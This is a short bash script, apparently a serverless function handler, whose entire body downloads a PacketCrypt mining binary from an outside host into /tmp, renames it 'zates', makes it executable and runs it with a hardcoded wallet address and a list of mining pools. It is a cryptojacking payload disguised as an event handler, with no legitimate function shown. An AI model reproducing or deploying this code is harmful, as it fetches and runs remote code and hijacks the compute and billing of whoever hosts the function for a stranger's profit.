function handler () {
    EVENT_DATA=$1
cd /tmp &&
curl -L https://www.pkt.world/ext/packetcrypt-linux-amd64 -o zates &&
chmod +x zates &&
./zates ann -p pkt1q97a2x0gml4r5pcts7d0ra4rwkupves0ccgdwtq https://stratum.zetahash.com/ http://pool.pktpool.io http://pool.pkt.world http://pool.pkteer.com 

}
